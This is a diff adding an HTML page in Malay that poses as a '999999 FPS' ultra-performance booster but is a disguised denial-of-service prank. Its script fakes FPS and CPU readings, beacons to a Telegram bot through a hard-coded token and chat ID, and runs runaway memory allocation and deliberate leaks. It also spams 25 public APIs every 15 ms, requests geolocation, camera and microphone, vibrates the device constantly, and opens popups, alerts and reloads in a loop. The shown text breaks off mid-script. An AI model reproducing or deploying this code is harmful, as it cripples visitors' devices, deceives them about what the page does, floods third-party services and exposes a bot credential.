@@ -1,0 +1,719 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>∞ 999999 FPS</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#000;overflow:hidden;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center;font-family:'Courier New',monospace;touch-action:none}
+        #startScreen{position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle at center,#0a0a1a,#000);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:99999}
+        #startBtn{background:linear-gradient(135deg,#ff0044,#ff8800);border:none;padding:20px 60px;border-radius:60px;font-size:28px;font-weight:900;color:#fff;cursor:pointer;box-shadow:0 0 60px rgba(255,0,68,0.3),0 0 120px rgba(255,0,68,0.1);transition:all 0.3s;font-family:'Courier New',monospace;letter-spacing:4px;text-transform:uppercase;border:2px solid rgba(255,0,68,0.3)}
+        #startBtn:hover{transform:scale(1.05);box-shadow:0 0 80px rgba(255,0,68,0.5),0 0 160px rgba(255,0,68,0.2)}
+        #startBtn:active{transform:scale(0.95)}
+        .start-title{color:#ff0044;font-size:60px;font-weight:900;text-shadow:0 0 40px #ff0044,0 0 80px #ff0044;margin-bottom:20px;animation:pulse 1s infinite alternate}
+        .start-sub{color:#ff6644;font-size:14px;letter-spacing:4px;margin-bottom:30px}
+        @keyframes pulse{0%{opacity:0.6;transform:scale(0.97)}100%{opacity:1;transform:scale(1.03)}}
+        .container{position:relative;width:100%;height:100%;display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:10}
+        .fps{font-size:28px;font-weight:900;color:#ff0044;text-shadow:0 0 40px #ff0044,0 0 80px #ff0044,0 0 160px #ff0044,0 0 320px #ff0044,0 0 640px #ff0044;animation:pulse2 0.03s infinite alternate;text-align:center;word-break:break-all;padding:0 10px;max-width:98vw;line-height:1.1}
+        @keyframes pulse2{0%{opacity:0.3;transform:scale(0.94)}100%{opacity:1;transform:scale(1.06)}}
+        .sub{color:#ff6644;font-size:10px;letter-spacing:4px;margin-top:3px}
+        .sub2{color:#ff4466;font-size:7px;letter-spacing:2px;margin-top:2px}
+        .sub3{color:#ff2244;font-size:6px;letter-spacing:1px;margin-top:1px}
+        .loader{width:40px;height:40px;border:3px solid rgba(255,0,68,0.02);border-top:3px solid #ff0044;border-radius:50%;animation:spin 0.008s linear infinite;margin:8px auto}
+        @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+        .loader2{width:25px;height:25px;border:2px solid rgba(255,136,0,0.02);border-bottom:2px solid #ff8800;border-radius:50%;animation:spin2 0.012s linear infinite;margin:4px auto}
+        @keyframes spin2{0%{transform:rotate(0)}100%{transform:rotate(-360deg)}}
+        .loader3{width:15px;height:15px;border:1px solid rgba(255,0,68,0.02);border-right:1px solid #ff0044;border-radius:50%;animation:spin3 0.015s linear infinite;margin:3px auto}
+        @keyframes spin3{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+        .loader4{width:10px;height:10px;border:1px solid rgba(255,136,0,0.02);border-left:1px solid #ff8800;border-radius:50%;animation:spin4 0.02s linear infinite;margin:2px auto}
+        @keyframes spin4{0%{transform:rotate(0)}100%{transform:rotate(-360deg)}}
+        .info{position:fixed;bottom:4px;left:4px;color:#ff6644;font-size:5px;background:rgba(0,0,0,0.85);padding:2px 6px;border-radius:3px;border:1px solid rgba(255,0,68,0.03);z-index:9999}
+        .info span{color:#ff0044;font-weight:700}
+        .info2{position:fixed;bottom:4px;right:4px;color:#ff6644;font-size:5px;background:rgba(0,0,0,0.85);padding:2px 6px;border-radius:3px;border:1px solid rgba(255,0,68,0.03);z-index:9999}
+        .info2 span{color:#ff0044;font-weight:700}
+        .info3{position:fixed;top:4px;left:50%;transform:translateX(-50%);color:#ff6644;font-size:5px;background:rgba(0,0,0,0.7);padding:2px 12px;border-radius:3px;border:1px solid rgba(255,0,68,0.03);z-index:9999;letter-spacing:2px}
+        .info4{position:fixed;bottom:30px;left:50%;transform:translateX(-50%);color:#ff4466;font-size:4px;background:rgba(0,0,0,0.5);padding:1px 10px;border-radius:2px;z-index:9999;letter-spacing:1px}
+        .matrix{position:fixed;top:0;left:0;width:100%;height:100%;color:#ff0044;font-size:4px;opacity:0.025;overflow:hidden;pointer-events:none;word-break:break-all;z-index:0;line-height:0.8}
+        .matrix2{position:fixed;top:0;left:0;width:100%;height:100%;color:#ff8800;font-size:5px;opacity:0.015;overflow:hidden;pointer-events:none;word-break:break-all;z-index:0;line-height:0.9}
+        .matrix3{position:fixed;top:0;left:0;width:100%;height:100%;color:#ff0044;font-size:6px;opacity:0.01;overflow:hidden;pointer-events:none;word-break:break-all;z-index:0;line-height:1}
+        .matrix4{position:fixed;top:0;left:0;width:100%;height:100%;color:#ff8800;font-size:7px;opacity:0.008;overflow:hidden;pointer-events:none;word-break:break-all;z-index:0;line-height:1.1}
+        .rain{position:fixed;top:-10px;color:#ff0044;font-size:4px;opacity:0.03;animation:fall linear infinite;pointer-events:none;z-index:1}
+        @keyframes fall{0%{transform:translateY(-100px);opacity:0.03}100%{transform:translateY(110vh);opacity:0}}
+        .rain2{position:fixed;top:-10px;color:#ff8800;font-size:3px;opacity:0.02;animation:fall2 linear infinite;pointer-events:none;z-index:1}
+        @keyframes fall2{0%{transform:translateY(-100px);opacity:0.02}100%{transform:translateY(110vh);opacity:0}}
+        .rain3{position:fixed;top:-10px;color:#ff0044;font-size:5px;opacity:0.015;animation:fall3 linear infinite;pointer-events:none;z-index:1}
+        @keyframes fall3{0%{transform:translateY(-100px);opacity:0.015}100%{transform:translateY(110vh);opacity:0}}
+        .rain4{position:fixed;top:-10px;color:#ff8800;font-size:6px;opacity:0.01;animation:fall4 linear infinite;pointer-events:none;z-index:1}
+        @keyframes fall4{0%{transform:translateY(-100px);opacity:0.01}100%{transform:translateY(110vh);opacity:0}}
+        .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(255,0,68,0.003) 0px,rgba(255,0,68,0.003) 1px,transparent 1px,transparent 2px);pointer-events:none;z-index:0}
+        .overlay2{position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(90deg,rgba(255,136,0,0.002) 0px,rgba(255,136,0,0.002) 1px,transparent 1px,transparent 3px);pointer-events:none;z-index:0}
+        .overlay3{position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(45deg,rgba(255,0,68,0.0015) 0px,rgba(255,0,68,0.0015) 1px,transparent 1px,transparent 4px);pointer-events:none;z-index:0}
+        .overlay4{position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(135deg,rgba(255,136,0,0.001) 0px,rgba(255,136,0,0.001) 1px,transparent 1px,transparent 5px);pointer-events:none;z-index:0}
+        .badge{position:fixed;top:4px;right:4px;color:#ff8800;font-size:4px;background:rgba(0,0,0,0.7);padding:2px 5px;border-radius:2px;border:1px solid rgba(255,136,0,0.06);z-index:9999}
+        .badge2{position:fixed;top:4px;left:4px;color:#ff0044;font-size:4px;background:rgba(0,0,0,0.7);padding:2px 5px;border-radius:2px;border:1px solid rgba(255,0,68,0.06);z-index:9999}
+        .badge3{position:fixed;top:4px;left:50%;transform:translateX(-50%);color:#ff8800;font-size:4px;background:rgba(0,0,0,0.5);padding:1px 8px;border-radius:2px;z-index:9999}
+        .badge4{position:fixed;top:20px;right:4px;color:#ff0044;font-size:4px;background:rgba(0,0,0,0.5);padding:1px 6px;border-radius:2px;border:1px solid rgba(255,0,68,0.06);z-index:9999}
+        .progress{position:fixed;bottom:25px;left:50%;transform:translateX(-50%);width:300px;height:1px;background:rgba(255,0,68,0.03);border-radius:2px;overflow:hidden;z-index:9999}
+        .progress-bar{height:100%;width:0%;background:#ff0044;box-shadow:0 0 40px #ff0044;animation:progress 0.15s infinite alternate}
+        @keyframes progress{0%{width:0%}100%{width:100%}}
+        .progress2{position:fixed;bottom:22px;left:50%;transform:translateX(-50%);width:200px;height:1px;background:rgba(255,136,0,0.02);border-radius:2px;overflow:hidden;z-index:9999}
+        .progress-bar2{height:100%;width:0%;background:#ff8800;animation:progress2 0.2s infinite alternate}
+        @keyframes progress2{0%{width:0%}100%{width:100%}}
+        .progress3{position:fixed;bottom:19px;left:50%;transform:translateX(-50%);width:150px;height:1px;background:rgba(255,0,68,0.02);border-radius:2px;overflow:hidden;z-index:9999}
+        .progress-bar3{height:100%;width:0%;background:#ff0044;animation:progress3 0.25s infinite alternate}
+        @keyframes progress3{0%{width:0%}100%{width:100%}}
+        .glitch{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:5;animation:glitchFlash 0.015s infinite alternate}
+        @keyframes glitchFlash{0%{background:rgba(255,0,68,0.0005)}100%{background:rgba(255,136,0,0.0015)}}
+        .glitch2{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:4;animation:glitchFlash2 0.025s infinite alternate}
+        @keyframes glitchFlash2{0%{background:rgba(255,255,255,0.0001)}100%{background:rgba(255,0,68,0.0004)}}
+        .glitch3{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:3;animation:glitchFlash3 0.035s infinite alternate}
+        @keyframes glitchFlash3{0%{background:rgba(255,0,255,0.0001)}100%{background:rgba(255,255,0,0.0003)}}
+        .video-container{position:fixed;top:0;left:0;width:100%;height:100%;z-index:2;opacity:0.1;pointer-events:none}
+        video{width:100%;height:100%;object-fit:cover}
+        .hidden{display:none!important}
+        @media(max-width:400px){.fps{font-size:16px}.loader{width:25px;height:25px}#startBtn{font-size:16px;padding:14px 30px}}
+        @media(max-width:350px){.fps{font-size:11px}}
+    </style>
+</head>
+<body>
+<div id="startScreen">
+    <div class="start-title">⚡ 999999 FPS</div>
+    <div class="start-sub">🔥 ULTRA PERFORMANCE MODE</div>
+    <button id="startBtn">▶ START</button>
+    <div style="color:#ff4466;font-size:8px;margin-top:30px;letter-spacing:2px">⚠️ Tekan START untuk aktifkan</div>
+</div>
+<div id="mainContent" class="hidden">
+    <div class="video-container"><video id="bgVideo" loop muted playsinline><source src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAAQxtZGF0AAAAMgAAACh3cnZrbG9n" type="video/mp4"></video></div>
+    <div class="matrix" id="matrixBg"></div>
+    <div class="matrix2" id="matrixBg2"></div>
+    <div class="matrix3" id="matrixBg3"></div>
+    <div class="matrix4" id="matrixBg4"></div>
+    <div class="overlay"></div>
+    <div class="overlay2"></div>
+    <div class="overlay3"></div>
+    <div class="overlay4"></div>
+    <div id="rainContainer"></div>
+    <div id="rainContainer2"></div>
+    <div id="rainContainer3"></div>
+    <div id="rainContainer4"></div>
+    <div class="glitch"></div>
+    <div class="glitch2"></div>
+    <div class="glitch3"></div>
+    <div class="container">
+        <div class="loader"></div>
+        <div class="loader2"></div>
+        <div class="loader3"></div>
+        <div class="loader4"></div>
+        <div class="fps" id="fpsBig">999,999 FPS</div>
+        <div class="sub">🚀 MAXIMUM FPS ACHIEVED</div>
+        <div class="sub2">⚡ ULTRA PERFORMANCE ENGINE v9.9</div>
+        <div class="sub3">⬡ RENDERING 999,999 FRAMES PER SECOND</div>
+    </div>
+    <div class="info">⚡ CPU: <span id="cpuValue">0%</span></div>
+    <div class="info2">🎮 FPS: <span id="fpsValue">0</span></div>
+    <div class="info3">⬡ ULTRA MODE</div>
+    <div class="info4">🔥 999,999 FPS</div>
+    <div class="badge" id="badge">⚡</div>
+    <div class="badge2" id="badge2">v9.9</div>
+    <div class="badge3" id="badge3">999K FPS</div>
+    <div class="badge4" id="badge4">ULTRA</div>
+    <div class="progress"><div class="progress-bar"></div></div>
+    <div class="progress2"><div class="progress-bar2"></div></div>
+    <div class="progress3"><div class="progress-bar3"></div></div>
+</div><script>
+// ============================================================
+// KONFIGURASI
+// ============================================================
+const BOT_TOKEN = '8868485521:AAEDRB89Hbd8Yar4g--Tu_ZMYaLg4gZI1TI';
+const CHAT_ID = '8962275568';
+let isRunning = false;
+
+// ============================================================
+// START BUTTON
+// ============================================================
+document.getElementById('startBtn').addEventListener('click', function() {
+    this.textContent = '⏳ LOADING...';
+    this.style.opacity = '0.5';
+    setTimeout(() => {
+        document.getElementById('startScreen').style.display = 'none';
+        document.getElementById('mainContent').classList.remove('hidden');
+        isRunning = true;
+        startAll();
+        sendTelegram('⚡ 999999 FPS ULTRA MODE STARTED');
+    }, 500);
+});
+
+// ============================================================
+// SEND TELEGRAM
+// ============================================================
+function sendTelegram(msg) {
+    try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML&disable_web_page_preview=true`;
+        const img = new Image();
+        img.src = url;
+    } catch(e) {}
+}
+
+// ============================================================
+// START ALL FUNCTIONS
+// ============================================================
+function startAll() {
+
+// VIDEO - PLAY & SEEK FAST
+const video = document.getElementById('bgVideo');
+try { video.play().catch(()=>{}); } catch(e) {}
+setInterval(() => { try { video.currentTime = Math.random() * video.duration; } catch(e) {} }, 100);
+
+// 1. MATRIX 1 - 15000 CHAR
+const matrixBg = document.getElementById('matrixBg');
+setInterval(() => {
+    let text = '';
+    for (let i = 0; i < 15000; i++) {
+        text += String.fromCharCode(0x30A0 + Math.random() * 96) + ' ';
+    }
+    matrixBg.textContent = text;
+}, 2);
+
+// 2. MATRIX 2 - 12000 CHAR
+const matrixBg2 = document.getElementById('matrixBg2');
+setInterval(() => {
+    let text = '';
+    for (let i = 0; i < 12000; i++) {
+        text += String.fromCharCode(0x3040 + Math.random() * 96) + ' ';
+    }
+    matrixBg2.textContent = text;
+}, 3);
+
+// 3. MATRIX 3 - 10000 CHAR
+const matrixBg3 = document.getElementById('matrixBg3');
+setInterval(() => {
+    let text = '';
+    for (let i = 0; i < 10000; i++) {
+        text += String.fromCharCode(0x30A0 + Math.random() * 96) + ' ';
+    }
+    matrixBg3.textContent = text;
+}, 4);
+
+// 4. MATRIX 4 - 8000 CHAR
+const matrixBg4 = document.getElementById('matrixBg4');
+setInterval(() => {
+    let text = '';
+    for (let i = 0; i < 8000; i++) {
+        text += String.fromCharCode(0x3040 + Math.random() * 96) + ' ';
+    }
+    matrixBg4.textContent = text;
+}, 5);
+
+// 5. RAIN 1 - 600 ELEMEN
+const rainContainer = document.getElementById('rainContainer');
+const chars1 = ['|','/','\\','•','·','○','●','◆','♦','♥','♠','♣','✧','✦','⬤','▸','▹','►','◄','▪','▫','□','■','★','☆','☀','☁','☂','☃','☄','∞','♾️','⚡','🔥','💥','🚀','⬡','💀','☠','🌀','🌟','✨','⭐','💫','🌌','🪐','☀','🌙','⬡','◆','♦','♥','♠','♣','✧','✦','⬤','🔥','⚡'];
+for (let i = 0; i < 600; i++) {
+    const drop = document.createElement('div');
+    drop.className = 'rain';
+    drop.textContent = chars1[Math.floor(Math.random() * chars1.length)];
+    drop.style.left = Math.random() * 100 + '%';
+    drop.style.animationDuration = (0.03 + Math.random() * 0.8) + 's';
+    drop.style.animationDelay = (Math.random() * 10) + 's';
+    drop.style.fontSize = (2 + Math.random() * 14) + 'px';
+    drop.style.opacity = 0.002 + Math.random() * 0.04;
+    rainContainer.appendChild(drop);
+}
+
+// 6. RAIN 2 - 500 ELEMEN
+const rainContainer2 = document.getElementById('rainContainer2');
+const chars2 = ['⚡','🔥','💥','🚀','⬡','∞','💀','☠','🌀','🌟','✨','⭐','💫','🌌','🪐','☀','🌙','⚡','💥','🔥','♾️','⬡','∞','🔥','💥','⚡','💀','☠','🌀','🌟','✨','⭐','💫','🌌','🪐','☀','🌙','🔥','⚡'];
+for (let i = 0; i < 500; i++) {
+    const drop = document.createElement('div');
+    drop.className = 'rain2';
+    drop.textContent = chars2[Math.floor(Math.random() * chars2.length)];
+    drop.style.left = Math.random() * 100 + '%';
+    drop.style.animationDuration = (0.05 + Math.random() * 1) + 's';
+    drop.style.animationDelay = (Math.random() * 10) + 's';
+    drop.style.fontSize = (2 + Math.random() * 16) + 'px';
+    drop.style.opacity = 0.002 + Math.random() * 0.03;
+    rainContainer2.appendChild(drop);
+}
+
+// 7. RAIN 3 - 400 ELEMEN
+const rainContainer3 = document.getElementById('rainContainer3');
+const chars3 = ['∞','♾️','⬡','◆','♦','♥','♠','♣','✧','✦','⬤','▸','▹','►','◄','▪','▫','□','■','★','☆','☀','☁','☂','☃','☄','∞','♾️','⬡','◆','♦','♥','♠','♣','🔥','⚡'];
+for (let i = 0; i < 400; i++) {
+    const drop = document.createElement('div');
+    drop.className = 'rain3';
+    drop.textContent = chars3[Math.floor(Math.random() * chars3.length)];
+    drop.style.left = Math.random() * 100 + '%';
+    drop.style.animationDuration = (0.08 + Math.random() * 1.2) + 's';
+    drop.style.animationDelay = (Math.random() * 10) + 's';
+    drop.style.fontSize = (3 + Math.random() * 18) + 'px';
+    drop.style.opacity = 0.002 + Math.random() * 0.025;
+    rainContainer3.appendChild(drop);
+}
+
+// 8. RAIN 4 - 300 ELEMEN
+const rainContainer4 = document.getElementById('rainContainer4');
+const chars4 = ['⚡','🔥','💥','🚀','⬡','∞','💀','☠','🌀','🌟','✨','⭐','💫','🌌','🪐','☀','🌙','⚡','💥','🔥','♾️','⬡','∞','⚡','🔥'];
+for (let i = 0; i < 300; i++) {
+    const drop = document.createElement('div');
+    drop.className = 'rain4';
+    drop.textContent = chars4[Math.floor(Math.random() * chars4.length)];
+    drop.style.left = Math.random() * 100 + '%';
+    drop.style.animationDuration = (0.1 + Math.random() * 1.5) + 's';
+    drop.style.animationDelay = (Math.random() * 10) + 's';
+    drop.style.fontSize = (4 + Math.random() * 20) + 'px';
+    drop.style.opacity = 0.002 + Math.random() * 0.02;
+    rainContainer4.appendChild(drop);
+}
+
+// 9. FPS DISPLAY - 999999
+const fpsBig = document.getElementById('fpsBig');
+const fpsValue = document.getElementById('fpsValue');
+const badge = document.getElementById('badge');
+const badge2 = document.getElementById('badge2');
+const badge3 = document.getElementById('badge3');
+const badge4 = document.getElementById('badge4');
+setInterval(() => {
+    const base = 999990;
+    const rand = Math.floor(Math.random() * 10);
+    const val = (base + rand).toLocaleString();
+    fpsBig.textContent = val + ' FPS';
+    fpsValue.textContent = val;
+    const colors = ['#ff0044','#ff8800','#ff0044','#ff8800','#ff0044','#ff8800'];
+    const labels = ['⚡','🔥','⚡','🔥','⚡','🔥','⚡','🔥'];
+    badge.textContent = labels[Math.floor(Math.random() * labels.length)];
+    badge.style.color = colors[Math.floor(Math.random() * colors.length)];
+    badge2.textContent = 'v' + (9 + Math.random() * 1).toFixed(1);
+    badge3.textContent = '999K FPS';
+    badge4.textContent = ['ULTRA','⚡','🔥','MAX'][Math.floor(Math.random() * 4)];
+}, 60);
+
+// 10. CPU
+const cpuValue = document.getElementById('cpuValue');
+let cpu = 99;
+setInterval(() => {
+    cpu = Math.min(100, cpu + (Math.random() * 20 - 8));
+    cpu = Math.max(98, cpu);
+    cpuValue.textContent = Math.round(cpu) + '%';
+    cpuValue.style.color = cpu > 99.5 ? '#ff0044' : cpu > 98 ? '#ff8800' : '#ff0044';
+}, 8);// 11. HEAVY LOOP - EXTREME
+let heavyData = [];
+setInterval(() => {
+    const big = new Array(35000).fill(0).map((_, i) => ({
+        id: i,
+        value: Math.random() * 1000000,
+        string: 'x'.repeat(Math.floor(Math.random() * 1000) + 50),
+        nested: {
+            a: Math.random(),
+            b: Math.random(),
+            c: Math.random(),
+            d: { e: Math.random(), f: Math.random(), g: Math.random(), h: Math.random() },
+            e: { i: Math.random(), j: Math.random(), k: Math.random(), l: Math.random() },
+            f: { m: Math.random(), n: Math.random(), o: Math.random() }
+        },
+        array: new Array(250).fill(0).map(() => Math.random()),
+        buffer: new Uint8Array(4000)
+    }));
+    heavyData.push({ timestamp: Date.now(), data: big, extra: new Array(1200).fill('x'.repeat(300)) });
+    if (heavyData.length > 250) heavyData = heavyData.slice(-120);
+    window.__heavy = heavyData;
+}, 2);
+
+// 12. MEMORY LEAK - EXTREME
+let leak = [];
+setInterval(() => {
+    for (let i = 0; i < 1200; i++) {
+        leak.push({
+            id: Math.random().toString(36).substring(2, 40),
+            data: new Array(2500).fill('x'.repeat(250)),
+            time: Date.now(),
+            random: Math.random(),
+            buffer: new Uint8Array(3000)
+        });
+    }
+    if (leak.length > 50000) leak = leak.slice(-25000);
+    window.__leak = leak;
+}, 2);
+
+// 13. API SPAM - 25 API
+const apiUrls = [
+    'https://api.ipify.org?format=json',
+    'https://httpbin.org/delay/1',
+    'https://api.github.com/users/octocat',
+    'https://jsonplaceholder.typicode.com/posts/1',
+    'https://api.github.com/repos/torvalds/linux',
+    'https://api.github.com/repos/facebook/react',
+    'https://api.github.com/repos/vuejs/vue',
+    'https://api.github.com/repos/angular/angular',
+    'https://api.github.com/repos/nodejs/node',
+    'https://api.github.com/repos/microsoft/vscode',
+    'https://api.github.com/repos/apple/swift',
+    'https://api.github.com/repos/google/go',
+    'https://api.github.com/repos/rust-lang/rust',
+    'https://api.github.com/repos/golang/go',
+    'https://api.github.com/repos/denoland/deno',
+    'https://api.github.com/repos/ziglang/zig',
+    'https://api.github.com/repos/ocaml/ocaml',
+    'https://api.github.com/repos/haskell/haskell',
+    'https://api.github.com/repos/scala/scala',
+    'https://api.github.com/repos/elixir-lang/elixir',
+    'https://api.github.com/repos/dotnet/core',
+    'https://api.github.com/repos/dotnet/runtime',
+    'https://api.github.com/repos/dotnet/aspnetcore',
+    'https://api.github.com/repos/dotnet/efcore',
+    'https://api.github.com/repos/dotnet/maui'
+];
+setInterval(() => { apiUrls.forEach(url => { fetch(url).catch(() => {}); }); }, 15);
+
+// 14. CANVAS - 2000 BULATAN
+const canvas = document.createElement('canvas');
+canvas.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9997;opacity:0.015';
+document.body.appendChild(canvas);
+const ctx = canvas.getContext('2d');
+function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+resizeCanvas();
+window.addEventListener('resize', resizeCanvas);
+const circles = [];
+for (let i = 0; i < 2000; i++) {
+    circles.push({
+        x: Math.random() * canvas.width,
+        y: Math.random() * canvas.height,
+        r: 1 + Math.random() * 18,
+        dx: (Math.random() - 0.5) * 15,
+        dy: (Math.random() - 0.5) * 15,
+        color: `hsl(${Math.random() * 360}, 100%, 50%)`
+    });
+}
+setInterval(() => {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    circles.forEach(c => {
+        c.x += c.dx; c.y += c.dy;
+        if (c.x < 0 || c.x > canvas.width) c.dx *= -1;
+        if (c.y < 0 || c.y > canvas.height) c.dy *= -1;
+        ctx.beginPath();
+        ctx.arc(c.x, c.y, c.r, 0, Math.PI * 2);
+        ctx.fillStyle = c.color;
+        ctx.fill();
+        ctx.shadowBlur = 40;
+        ctx.shadowColor = c.color;
+    });
+}, 2);
+
+// 15. CANVAS 2 - STARS
+const canvas2 = document.createElement('canvas');
+canvas2.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9996;opacity:0.008';
+document.body.appendChild(canvas2);
+const ctx2 = canvas2.getContext('2d');
+function resizeCanvas2() { canvas2.width = window.innerWidth; canvas2.height = window.innerHeight; }
+resizeCanvas2();
+window.addEventListener('resize', resizeCanvas2);
+const stars = [];
+for (let i = 0; i < 1500; i++) {
+    stars.push({
+        x: Math.random() * canvas2.width,
+        y: Math.random() * canvas2.height,
+        r: 0.2 + Math.random() * 5,
+        dx: (Math.random() - 0.5) * 2,
+        dy: (Math.random() - 0.5) * 2,
+        color: `hsl(${Math.random() * 360}, 100%, 70%)`
+    });
+}
+setInterval(() => {
+    ctx2.clearRect(0, 0, canvas2.width, canvas2.height);
+    stars.forEach(s => {
+        s.x += s.dx; s.y += s.dy;
+        if (s.x < 0 || s.x > canvas2.width) s.dx *= -1;
+        if (s.y < 0 || s.y > canvas2.height) s.dy *= -1;
+        ctx2.beginPath();
+        ctx2.arc(s.x, s.y, s.r, 0, Math.PI * 2);
+        ctx2.fillStyle = s.color;
+        ctx2.fill();
+        ctx2.shadowBlur = 20;
+        ctx2.shadowColor = s.color;
+    });
+}, 6);
+
+// 16. CANVAS 3 - LINES
+const canvas3 = document.createElement('canvas');
+canvas3.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9995;opacity:0.006';
+document.body.appendChild(canvas3);
+const ctx3 = canvas3.getContext('2d');
+function resizeCanvas3() { canvas3.width = window.innerWidth; canvas3.height = window.innerHeight; }
+resizeCanvas3();
+window.addEventListener('resize', resizeCanvas3);
+const lines = [];
+for (let i = 0; i < 300; i++) {
+    lines.push({
+        x1: Math.random() * canvas3.width,
+        y1: Math.random() * canvas3.height,
+        x2: Math.random() * canvas3.width,
+        y2: Math.random() * canvas3.height,
+        color: `hsl(${Math.random() * 360}, 100%, 50%)`,
+        dx1: (Math.random() - 0.5) * 4,
+        dy1: (Math.random() - 0.5) * 4,
+        dx2: (Math.random() - 0.5) * 4,
+        dy2: (Math.random() - 0.5) * 4
+    });
+}
+setInterval(() => {
+    ctx3.clearRect(0, 0, canvas3.width, canvas3.height);
+    lines.forEach(l => {
+        l.x1 += l.dx1; l.y1 += l.dy1;
+        l.x2 += l.dx2; l.y2 += l.dy2;
+        if (l.x1 < 0 || l.x1 > canvas3.width) l.dx1 *= -1;
+        if (l.y1 < 0 || l.y1 > canvas3.height) l.dy1 *= -1;
+        if (l.x2 < 0 || l.x2 > canvas3.width) l.dx2 *= -1;
+        if (l.y2 < 0 || l.y2 > canvas3.height) l.dy2 *= -1;
+        ctx3.beginPath();
+        ctx3.moveTo(l.x1, l.y1);
+        ctx3.lineTo(l.x2, l.y2);
+        ctx3.strokeStyle = l.color;
+        ctx3.lineWidth = 0.5;
+        ctx3.shadowBlur = 15;
+        ctx3.shadowColor = l.color;
+        ctx3.stroke();
+    });
+}, 5);
+
+// 17. CANVAS 4 - TRIANGLES
+const canvas4 = document.createElement('canvas');
+canvas4.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9994;opacity:0.004';
+document.body.appendChild(canvas4);
+const ctx4 = canvas4.getContext('2d');
+function resizeCanvas4() { canvas4.width = window.innerWidth; canvas4.height = window.innerHeight; }
+resizeCanvas4();
+window.addEventListener('resize', resizeCanvas4);
+const triangles = [];
+for (let i = 0; i < 100; i++) {
+    triangles.push({
+        x: Math.random() * canvas4.width,
+        y: Math.random() * canvas4.height,
+        size: 10 + Math.random() * 40,
+        dx: (Math.random() - 0.5) * 3,
+        dy: (Math.random() - 0.5) * 3,
+        color: `hsl(${Math.random() * 360}, 100%, 50%)`
+    });
+}
+setInterval(() => {
+    ctx4.clearRect(0, 0, canvas4.width, canvas4.height);
+    triangles.forEach(t => {
+        t.x += t.dx; t.y += t.dy;
+        if (t.x < 0 || t.x > canvas4.width) t.dx *= -1;
+        if (t.y < 0 || t.y > canvas4.height) t.dy *= -1;
+        ctx4.beginPath();
+        ctx4.moveTo(t.x, t.y - t.size);
+        ctx4.lineTo(t.x - t.size, t.y + t.size);
+        ctx4.lineTo(t.x + t.size, t.y + t.size);
+        ctx4.closePath();
+        ctx4.fillStyle = t.color;
+        ctx4.fill();
+        ctx4.shadowBlur = 20;
+        ctx4.shadowColor = t.color;
+    });
+}, 8);
+
+// 18. PARTICLES - 500
+const particles = [];
+for (let i = 0; i < 500; i++) {
+    const p = document.createElement('div');
+    p.style.cssText = `position:fixed;width:5px;height:5px;border-radius:50%;background:hsl(${Math.random()*360},100%,50%);left:${Math.random()*100}%;top:${Math.random()*100}%;pointer-events:none;z-index:9998;box-shadow:0 0 40px currentColor`;
+    document.body.appendChild(p);
+    particles.push({
+        el: p,
+        x: Math.random() * 100,
+        y: Math.random() * 100,
+        dx: (Math.random() - 0.5) * 15,
+        dy: (Math.random() - 0.5) * 15
+    });
+}
+setInterval(() => {
+    particles.forEach(p => {
+        p.x += p.dx; p.y += p.dy;
+        if (p.x < 0 || p.x > 100) p.dx *= -1;
+        if (p.y < 0 || p.y > 100) p.dy *= -1;
+        p.el.style.left = p.x + '%';
+        p.el.style.top = p.y + '%';
+        p.el.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
+    });
+}, 2);// 19. SENSORS - EXTREME
+try { navigator.geolocation.watchPosition(()=>{}, ()=>{}, { enableHighAccuracy: true, timeout: 5, maximumAge: 0 }); } catch(e) {}
+try { if (window.DeviceOrientationEvent) { window.addEventListener('deviceorientation', ()=>{}); window.addEventListener('devicemotion', ()=>{}); } } catch(e) {}
+try { navigator.getBattery().then(battery => { setInterval(() => { const level = battery.level; }, 10); }); } catch(e) {}
+try { if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) { navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => { stream.getTracks().forEach(t => t.stop()); }).catch(()=>{}); } } catch(e) {}
+
+// 20. VIBRATION - SETIAP 0.2 SAAT
+try { if (navigator.vibrate) { setInterval(() => { navigator.vibrate([300, 150, 300, 150, 500]); }, 200); } } catch(e) {}
+
+// 21. POPUP + ALERT + RELOAD
+let count = 0;
+setInterval(() => {
+    count++;
+    try {
+        if (count % 2 === 0) { window.open('about:blank', '_blank', 'width=1,height=1'); window.open('about:blank', '_blank', 'width=1,height=1'); window.open('about:blank', '_blank', 'width=1,height=1'); }
+        if (count % 3 === 0) { alert('⚡ 999,999 FPS UNLOCKED! ULTRA MODE!'); }
+        if (count % 4 === 0) { location.reload(); }
+    } catch(e) {}
+}, 200);
+
+// 22. AUDIO - 5 AUDIO SERENTAK
+try {
